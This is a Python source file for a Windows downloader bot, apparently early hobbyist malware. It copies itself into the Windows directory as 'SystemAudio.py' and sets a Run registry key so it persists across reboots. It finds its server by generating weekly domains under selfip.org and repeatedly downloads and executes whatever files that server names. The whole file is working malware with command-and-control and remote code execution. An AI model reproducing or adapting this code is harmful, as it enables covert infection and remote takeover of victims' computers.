'''
Created on 31. mars 2010

@author: ctrl_
'''
from _winreg import *
from time import strftime, gmtime
import winpaths, sys, shutil, time, os, hashlib, urllib2, socket


class main():
def __init__(self):
print("start")
time.sleep(2)
print(sys.argv[0])
if startup():
self.checkOldDomain()
else:
self.checkDomain()
self.winDir = winpaths.get_windows()+"\\"
failedAttempts = 0
oldId = ""
while True: #Main loop
if failedAttempts >= 60:
self.checkDomain()
failedAttempts = 0
try:
response = urllib2.urlopen(self.validDomain)
except:
failedAttempts += 1
time.sleep(6)
continue
contents = response.readlines()
for line in contents:
print(line)
if line.startswith("DownloadAndExecute"):
command = line.strip().split("=")
url = command[1]
name = command[2]
newId = command[3]
print(newId)
if newId == oldId:
print("done cmd")
break
else:
oldId = newId
print(url)

try:
fileDL = urllib2.urlopen(url)
except:
continue

print(name)
fileOut = open(self.winDir+name, "wb")
fileOut.write(fileDL.read())
fileOut.close()
os.spawnv(os.P_NOWAIT, self.winDir+name, (self.winDir+name,))
time.sleep(6)
print("Done")

def checkOldDomain(self):
keyVal = r"Software\Microsoft\Windows"
key = OpenKey(HKEY_LOCAL_MACHINE, keyVal, 0, KEY_ALL_ACCESS)
try:
oldDomain = QueryValueEx(key, "ValidVertificationDomain")
except:
self.checkDomain()
CloseKey(key)
return
CloseKey(key)
while True:
try:
response = urllib2.urlopen(oldDomain[0])
except:
self.checkDomain()
continue
break
data = response.read()
if data.find("AllenWalker") != -1:
self.validDomain = oldDomain[0]
else:
self.checkDomain()

def checkDomain(self):
self.date = str(strftime("%Y%U", gmtime()))
self.tall = 0
self.keyword = "test"
socket.setdefaulttimeout(1)
for x in range(0, 10):
domain = "http://"+self.generate()
try:
response = urllib2.urlopen(domain, timeout=5)
except:
print("Tested %s and failed." % domain)
self.tall += 1
continue
break
data = str(response.read())
if data.find("Allen") != -1:
print("%s is a valid domain" % self.generate())
self.validDomain = domain
self.writeDomain()
else:
print(data)

def writeDomain(self):
keyVal = r"Software\Microsoft\Windows"
try:
key = OpenKey(HKEY_LOCAL_MACHINE, keyVal, 0, KEY_ALL_ACCESS)
QueryValueEx(key, "ValidVertificationDomain")
CloseKey(key)
except:
key = CreateKey(HKEY_LOCAL_MACHINE, keyVal)
SetValueEx(key, "ValidVertificationDomain", 0, REG_SZ, self.validDomain)
CloseKey(key)

def generate(self):
return self.keyword+self.date+str(self.tall)+".selfip.org"

class startup():
def __init__(self):

self.winDir = winpaths.get_windows()+"\\"
if not self.runBefore():
self.copyToWinDir()
print(sys.argv[0])
else:
return


def runBefore(self):
keyVal = r"Software\Microsoft\Windows\CurrentVersion\Run"
try:
key = OpenKey(HKEY_LOCAL_MACHINE, keyVal, 0, KEY_ALL_ACCESS)
QueryValueEx(key, "SystemAudio")
CloseKey(key)
except:
print("First time running")
key = CreateKey(HKEY_LOCAL_MACHINE, keyVal)
SetValueEx(key, "SystemAudio", 0, REG_SZ, '"'+self.winDir+"SystemAudio.py"+'"')
CloseKey(key)
return False
print("run before.")
return True

def copyToWinDir(self):
try:
shutil.copy2(sys.argv[0], self.winDir+"SystemAudio.py")
except:pass

print("Copyed to windir")


main()